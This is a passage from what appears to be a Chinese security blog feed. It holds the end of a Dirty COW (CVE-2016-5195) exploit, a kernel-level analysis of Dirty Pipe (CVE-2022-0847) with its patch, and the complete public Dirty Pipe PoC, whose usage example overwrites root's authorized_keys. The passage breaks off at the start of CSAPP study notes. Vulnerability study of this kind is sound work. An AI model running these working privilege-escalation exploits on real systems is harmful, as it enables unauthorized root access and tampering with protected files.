class="hljs-comment">*/</span><br>    c+=madvise(<span class="hljs-built_in">map</span>,<span class="hljs-number">100</span>,MADV_DONTNEED);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;madvise %d\n\n&quot;</span>,c);<br>&#125;<br> <br><span class="hljs-type">void</span> *<span class="hljs-title function_">procselfmemThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16</span><br><span class="hljs-comment">&gt;  The in the wild exploit we are aware of doesn&#x27;t work on Red Hat</span><br><span class="hljs-comment">&gt;  Enterprise Linux 5 and 6 out of the box because on one side of</span><br><span class="hljs-comment">&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not</span><br><span class="hljs-comment">&gt;  writable on Red Hat Enterprise Linux 5 and 6.</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-type">int</span> f=open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>,O_RDWR);<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to reset the file pointer to the memory position.</span><br><span class="hljs-comment">*/</span><br>    lseek(f,(<span class="hljs-type">uintptr_t</span>) <span class="hljs-built_in">map</span>,SEEK_SET);<br>    c+=write(f,str,<span class="hljs-built_in">strlen</span>(str));<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;procselfmem %d\n\n&quot;</span>, c);<br>&#125;<br> <br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to pass two arguments. File and Contents.</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-keyword">if</span> (argc&lt;<span class="hljs-number">3</span>) &#123;<br>  (<span class="hljs-type">void</span>)<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,<br>      <span class="hljs-string">&quot;usage: dirtyc0w target_file new_content&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;<br>  <span class="hljs-type">pthread_t</span> pth1,pth2;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to open the file in read only mode.</span><br><span class="hljs-comment">*/</span><br>  f=open(argv[<span class="hljs-number">1</span>],O_RDONLY);<br>  fstat(f,&amp;st);<br>  name=argv[<span class="hljs-number">1</span>];<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to use MAP_PRIVATE for copy-on-write mapping.</span><br><span class="hljs-comment">&gt; Create a private copy-on-write mapping.  Updates to the</span><br><span class="hljs-comment">&gt; mapping are not visible to other processes mapping the same</span><br><span class="hljs-comment">&gt; file, and are not carried through to the underlying file.  It</span><br><span class="hljs-comment">&gt; is unspecified whether changes made to the file after the</span><br><span class="hljs-comment">&gt; mmap() call are visible in the mapped region.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to open with PROT_READ.</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-built_in">map</span>=mmap(<span class="hljs-literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mmap %zx\n\n&quot;</span>,(<span class="hljs-type">uintptr_t</span>) <span class="hljs-built_in">map</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to do it on two threads.</span><br><span class="hljs-comment">*/</span><br>  pthread_create(&amp;pth1,<span class="hljs-literal">NULL</span>,madviseThread,argv[<span class="hljs-number">1</span>]);<br>  pthread_create(&amp;pth2,<span class="hljs-literal">NULL</span>,procselfmemThread,argv[<span class="hljs-number">2</span>]);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to wait for the threads to finish.</span><br><span class="hljs-comment">*/</span><br>  pthread_join(pth1,<span class="hljs-literal">NULL</span>);<br>  pthread_join(pth2,<span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.pediy.com/thread-266033.htm">https://bbs.pediy.com/thread-266033.htm</a></p><p><a href="https://dirtycow.ninja/">https://dirtycow.ninja/</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE-2016-5195</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-08475-DirtyPipe</title>
    <link href="/2023/06/07/CVE-2022-08475-DirtyPipe/"/>
    <url>/2023/06/07/CVE-2022-08475-DirtyPipe/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>CVE-2022-0847  DirtyPipe</code>脏管道漏洞是<code>Linux</code>内核中的一个漏洞，该漏洞允许写只读文件，从而导致提权。</p><h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul><li><code>ubuntu 20.04</code></li><li><code>Linux-5.16.10</code></li><li><code>qemu-system-x86_64 4.2.1</code></li></ul><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>首先创建一个只读文件<code>foo.txt</code>，并且正常情况下是无法修改该可读文件，但是利用了<code>DirtyPipe</code>漏洞后发现可以将字符<code>aaaa</code>写入到只读文件中</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221227160027149.png" alt="image-20221227160027149"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>以<code>poc</code>作为切入点，分析漏洞成因</p><p>首先<code>poc</code>创建了一个管道，管道缓冲区的默认大小为4096，并且拥有16个缓存区，因此再创建管道之后，<code>poc</code>首先要做的是将这16个管道缓冲区填满。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br><span class="hljs-keyword">if</span> (pipe(p)) <span class="hljs-built_in">abort</span>();<br><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> pipe_size = fcntl(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">4096</span>];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-type">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>write(p[<span class="hljs-number">1</span>], buffer, n);<br>r -= n;<br>&#125;<br>...<br></code></pre></td></tr></table></figure><p>在进行管道写的操作时，内核是采用<code>pipe_write</code>函数进行操作，这里截取了关键部分，在进行管道写的时候会判断通过函数<code>is_packetized</code>去判断是否为目录属性，如果不是则将缓冲区的标志位设置为<code>PIPE_BUF_FLAG_CAN_MERGE</code>，这个标志位非常关键，是导致漏洞成因，因此<code>poc</code>为了使16个管道缓冲区都设置<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志位，因此选择循环16次， 并且将每个管道缓冲区都写满。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221227161042200.png" alt="image-20221227161042200"></p><p>随着<code>poc</code>将管道内的数据全部读出，为了清空管道缓冲区，在进行管道读的过程中，内核采用的是<code>pipe_read</code>函数，在整个管道读的过程中是不会修改管道的标志位的，因此<code>PIPE_BUF_FLAG_CAN_MEGE</code>标志位依旧存在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-type">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>read(p[<span class="hljs-number">0</span>], buffer, n);<br>r -= n;<br>&#125;<br>...<br></code></pre></td></tr></table></figure><p>紧接着是触发漏洞的关键函数，<code>splice</code>函数，用于移动数据，此时<code>fd</code>指向我们想读取的文件，对应上述的<code>foo.txt</code>只读文件，p[1]指向的是我们的管道符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br><span class="hljs-type">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>...<br></code></pre></td></tr></table></figure><p>在调用<code>splice</code>函数时，内核在某个阶段会调用<code>copy_page_to_iter</code>函数，可以看到当管道满了之后就没办法通过<code>splice</code>函数往管道内继续输入数据，那么<code>splice</code>函数就无法正常执行了，因此需要清空管道内的数据。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221227162317690.png" alt="image-20221227162317690"></p><p>后面则到达了漏洞发生的代码，由于我们使用<code>splice</code>函数进行数据的移动，在内核中不是选择将数据直接从文件中拷贝到管道中，而是将文件所在的物理页直接赋值给管道缓冲区所对应的页面。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221227162727269.png" alt="image-20221227162727269"></p><p>这里记录一下物理页的地址</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221227162927180.png" alt="image-20221227162927180"></p><p>最后就是再次调用管道写的操作，但是这里实际会写入只读文件内部</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>nbytes = write(p[<span class="hljs-number">1</span>], data, data_size);<br>...<br></code></pre></td></tr></table></figure><p>由于已经通过<code>splice</code>函数移动数据到管道缓冲区古内部了，因此管道不为空会进入到<code>455</code>行的内部处理逻辑</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221227163143710.png" alt="image-20221227163143710"></p><p>最终到达了往只读文件写入的操作，这里看到了<code>PIPE_BUF_FLAG_CAN_MERGE</code>这个标志位的作用，该标志位就是会将数据合并，使得后续管道写的操作会继续向之前的管道缓冲区对应的物理页面继续写入，写入的操作是通过<code>copy_page_from_iter(buf-&gt;page,offset,chars,from)</code>函数进行完成的，该函数实际就是将<code>from</code>对应的数据写入到<code>buf-&gt;page</code>中</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221227163326700.png" alt="image-20221227163326700"></p><p>可以看到<code>buf-&gt;page</code>与<code>page</code>地址是完全一样的，这就导致我们将数据写入修改到<code>foo.txt</code>文件中</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221227163549082.png" alt="image-20221227163549082"></p><h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>补丁页比较简单，在获取物理页的同时把管道缓冲区的标志位清空，就不会导致后面对管道进行写操作的时候进入合并数据流的流程</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20221227164411448.png" alt="image-20221227164411448"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><code>DirtyPipe</code><strong>攻击流程</strong></p><ul><li>将所有管道缓冲区都设置<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志位</li><li>清空管道缓冲区</li><li>使用<code>splice</code>函数获取文件所对应的物理页</li><li>使用<code>pipe_write</code>函数对拥有<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志位的处理，对获得文件对应的物理页进行写入操作，从而达到对只读文件写入的操作</li></ul><p><code>DirtyPipe</code><strong>利用的限制</strong></p><ul><li>对文件有读权限，因为<code>splice</code>函数会首先判断对文件是否有可读权限，若无则无法正常执行</li><li>由于<code>DirtyPipe</code>是对文件对应的物理做覆写操作，因此不能修改超过文件本身大小的数据，以及文件的第一个字节无法被修改（因为<code>splice</code>函数需要移动至少一字节数据）</li><li>由于<code>DirtyPipe</code>是对物理页进行修改，因此修改数据大小也不能超过一页</li></ul><h1 id="完整的poc"><a href="#完整的poc" class="headerlink" title="完整的poc"></a>完整的poc</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="hljs-comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="hljs-comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="hljs-comment"> * file contents in the page cache, even if the file is not permitted</span><br><span class="hljs-comment"> * to be written, immutable or on a read-only mount.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="hljs-comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="hljs-comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="hljs-comment"> * there before, it just provided an easy way to exploit it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="hljs-comment"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="hljs-comment"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="hljs-comment"> * cross a page boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> p[<span class="hljs-number">2</span>])</span><br>&#123;<br><span class="hljs-keyword">if</span> (pipe(p)) <span class="hljs-built_in">abort</span>();<br><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> pipe_size = fcntl(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">4096</span>];<br><br><span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-type">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>write(p[<span class="hljs-number">1</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">   leaving the flags initialized) */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-type">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>read(p[<span class="hljs-number">0</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">   will be mergeable */</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* dumb command-line argument parser */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-type">const</span> path = argv[<span class="hljs-number">1</span>];<br><span class="hljs-type">loff_t</span> offset = strtoul(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-type">const</span> data = argv[<span class="hljs-number">3</span>];<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br><span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">loff_t</span> end_offset = offset + (<span class="hljs-type">loff_t</span>)data_size;<br><span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* open the input file and validate the specified offset */</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> fd = open(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;open failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-keyword">if</span> (fstat(fd, &amp;st)) &#123;<br>perror(<span class="hljs-string">&quot;stat failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="hljs-type">int</span> p[<span class="hljs-number">2</span>];<br>prepare_pipe(p);<br><br><span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">   pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>--offset;<br><span class="hljs-type">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;splice failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">   will instead write into the page cache, because of the</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>nbytes = write(p[<span class="hljs-number">1</span>], data, data_size);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;write failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>)nbytes &lt; data_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short write\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://0x434b.dev/learning-linux-kernel-exploitation-part-2-cve-2022-0847/">https://0x434b.dev/learning-linux-kernel-exploitation-part-2-cve-2022-0847/</a></p><p><a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com/</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE-2022-08475</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解计算机系统学习笔记</title>
    <link href="/2023/06/07/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/06/07/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="第7章-链接"><a href="#第7章-链接" class="headerlink" title="第7章 链接"></a>第7章 链接</h1><p>链接是将代码与数据组合为单一文件的过程。在现代系统中，链接由链接器的程序自动执行。</p><p>编译可存在如下周期：</p><ul><li>编译：源代码翻译为机器代码</li><li>加载：程序被加载器加载到内存并执行</li><li>运行：应用程序执行</li></ul><h2 id="7-1-编译器驱动程序"><a href="#7-1-编译器驱动程序" class="headerlink" title="7.1 编译器驱动程序"></a>7.1 编译器驱动程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//main.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> *a, <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span 